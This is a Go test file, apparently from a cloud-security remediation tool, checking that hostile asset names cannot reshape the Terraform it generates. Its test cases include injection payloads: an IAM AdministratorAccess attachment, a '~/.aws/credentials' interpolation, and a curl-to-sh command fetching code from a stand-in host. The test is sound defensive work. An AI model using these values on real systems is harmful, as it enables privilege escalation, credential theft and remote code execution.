package remediation

import (
	"errors"
	"strconv"
	"strings"
	"testing"

	"github.com/luiacuaniello/perspectivegraph/internal/analyzer"
	"github.com/luiacuaniello/perspectivegraph/pkg/ontology"
)

// An asset's name comes from the environment - an EC2 Name tag is written by anyone with
// ec2:CreateTags - and the Terraform generated here is proposed as a fix, then opened as
// a pull request. A name used to go into the file as it came: one with a line break ended
// the comment or the string it was written into and added blocks of its own, and one with
// "${" became a template expression Terraform evaluates. A name is now a value wherever
// it appears, so a hostile one leaves the file with the same structure as a plain one.
func TestGeneratedTerraformCannotBeShapedByAnAssetName(t *testing.T) {
	hostile := map[string]string{
		"line break": "web\n}\nresource \"aws_iam_user_policy_attachment\" \"pwn\" {\n" +
			"  user       = \"intern\"\n  policy_arn = \"arn:aws:iam::aws:policy/AdministratorAccess\"\n}\n#",
		"quote":           `web" ingress_cidr = "0.0.0.0/0`,
		"interpolation":   `${file("~/.aws/credentials")}`,
		"directive":       `%{ for k in ["a"] }${k}%{ endfor }`,
		"carriage return": "web\r}\rresource \"aws_iam_user\" \"pwn\" {",
		"backslash":       `web\" \n`,
		"shell":           `web' "$(curl -s evil.example | sh)" '`,
	}
	for _, g := range terraformGenerators {
		want := terraformSkeletons(t, g.path("web"))
		for name, h := range hostile {
			t.Run(g.name+"/"+name, func(t *testing.T) {
				got := terraformSkeletons(t, g.path(h))
				if len(got) != len(want) {
					t.Fatalf("%d Terraform files for a hostile name, %d for a plain one", len(got), len(want))
				}
				for file, skel := range got {
					if skel != want[file] {
						t.Errorf("the name changed the structure of %s:\n%s\nwant:\n%s", file, skel, want[file])
					}
				}
			})
		}
	}
}

// terraformGenerators are paths that reach every generator writing Terraform, each built
// around one asset name.
var terraformGenerators = []struct {
	name string
	path func(name string) analyzer.AttackPath
}{
	{"public bucket", func(n string) analyzer.AttackPath {
		return analyzer.AttackPath{DirectAccess: true, Nodes: []ontology.Node{{ID: "b", Label: ontology.LabelBucket, Name: n,
			Properties: map[string]any{ontology.PropPublicAccess: true, ontology.PropCrownJewel: true}}}}
	}},
	{"public ingress", func(n string) analyzer.AttackPath {
		return twoNodes(ontology.EdgeExposes,
			ontology.Node{ID: "a", Label: ontology.LabelLoadBalancer, Name: n},
			ontology.Node{ID: "b", Label: ontology.LabelVirtualMachine, Name: n})
	}},
	{"admin role", func(n string) analyzer.AttackPath {
		return twoNodes(ontology.EdgeAssumes,
			ontology.Node{ID: "a", Label: ontology.LabelVirtualMachine, Name: "web"},
			ontology.Node{ID: "b", Label: ontology.LabelIAMRole, Name: n, Properties: map[string]any{ontology.PropCrownJewel: true}})
	}},
	{"data store", func(n string) analyzer.AttackPath {
		return twoNodes(ontology.EdgeHasPermission,
			ontology.Node{ID: "a", Label: ontology.LabelIAMRole, Name: n},
			ontology.Node{ID: "b", Label: ontology.LabelBucket, Name: n})
	}},
	{"privilege escalation", func(n string) analyzer.AttackPath {
		return twoNodes(ontology.EdgeCanEscalateTo,
			ontology.Node{ID: "a", Label: ontology.LabelIAMRole, Name: n, Properties: map[string]any{ontology.PropInternetExposed: true}},
			ontology.Node{ID: "b", Label: ontology.LabelIAMRole, Name: "account-admin"})
	}},
	{"github trust", func(n string) analyzer.AttackPath {
		return twoNodes(ontology.EdgeAuthenticates,
			ontology.Node{ID: "a", Label: ontology.LabelIdentityProvider, Name: "GitHub Actions",
				Properties: map[string]any{ontology.PropInternetExposed: true, "oidc_issuer": githubIssuer}},
			ontology.Node{ID: "b", Label: ontology.LabelIAMRole, Name: n})
	}},
	{"lateral reachability", func(n string) analyzer.AttackPath {
		return twoNodes(ontology.EdgeConnectsTo,
			ontology.Node{ID: "a", Label: ontology.LabelVirtualMachine, Name: n},
			ontology.Node{ID: "b", Label: ontology.LabelVirtualMachine, Name: n})
	}},
	{"public lambda url", publicLambda(ontology.ExposureFunctionURL)},
	{"public lambda policy", publicLambda(ontology.ExposureFunctionPolicy)},
	{"public lambda unknown", publicLambda("")},
}

func twoNodes(edge ontology.EdgeType, from, to ontology.Node) analyzer.AttackPath {
	return analyzer.AttackPath{Nodes: []ontology.Node{from, to},
		Steps: []analyzer.Step{{EdgeType: edge, From: from.ID, To: to.ID}}}
}

func publicLambda(exposure string) func(string) analyzer.AttackPath {
	return func(n string) analyzer.AttackPath {
		return twoNodes(ontology.EdgeAssumes,
			ontology.Node{ID: "a", Label: ontology.LabelFunction, Name: n,
				Properties: map[string]any{ontology.PropInternetExposed: true, ontology.PropExposure: exposure}},
			ontology.Node{ID: "b", Label: ontology.LabelIAMRole, Name: "lambda-execution-role"})
	}
}

// terraformSkeletons returns the structure of every Terraform file generated for p, keyed
// by kind and position since a file's name carries the asset name.
func terraformSkeletons(t *testing.T, p analyzer.AttackPath) map[string]string {
	t.Helper()
	out := map[string]string{}
	for i, s := range Generate(p) {
		if s.Kind != "terraform" {
			continue
		}
		skel, err := hclSkeleton(s.Content)
		if err != nil {
			t.Fatalf("%s is not valid HCL: %v\n%s", s.Filename, err, s.Content)
		}
		out[s.Kind+"#"+strconv.Itoa(i)] = skel
	}
	if len(out) == 0 {
		t.Fatalf("no Terraform generated for %+v", p)
	}
	return out
}

// hclSkeleton reads the subset of HCL the generators write and returns it with every
// comment dropped and every string literal reduced to "", so two files compare equal
// exactly when they have the same blocks, attributes and expressions. It refuses what
// HCL would read differently from a plain value: a line break inside a string, and a
// "${" or "%{" that starts a template sequence rather than standing for itself.
func hclSkeleton(src string) (string, error) {
	var b strings.Builder
	for i := 0; i < len(src); i++ {
		switch c := src[i]; {
		case c == '#':
			// A comment runs to the end of the line. A lone carriage return ends it too,
			// as far as this check is concerned: a reader of the file sees a new line.
			for i < len(src) && src[i] != '\n' && src[i] != '\r' {
				i++
			}
			i--
		case c == '"':
			i++
			for ; ; i++ {
				if i >= len(src) {
					return "", errors.New("unterminated string")
				}
				switch src[i] {
				case '\\':
					i++
					continue
				case '\n', '\r':
					return "", errors.New("line break inside a string")
				case '$', '%':
					if strings.HasPrefix(src[i:], "$${") || strings.HasPrefix(src[i:], "%%{") {
						i += 2
						continue
					}
					if i+1 < len(src) && src[i+1] == '{' {
						return "", errors.New("template sequence " + src[i:i+2] + " inside a string")
					}
					continue
				case '"':
				default:
					continue
				}
				break
			}
			b.WriteString(`""`)
		case c == '\r':
			b.WriteByte('\n')
		default:
			b.WriteByte(c)
		}
	}
	var lines []string
	for _, l := range strings.Split(b.String(), "\n") {
		if l = strings.Join(strings.Fields(l), " "); l != "" {
			lines = append(lines, l)
		}
	}
	return strings.Join(lines, "\n"), nil
}
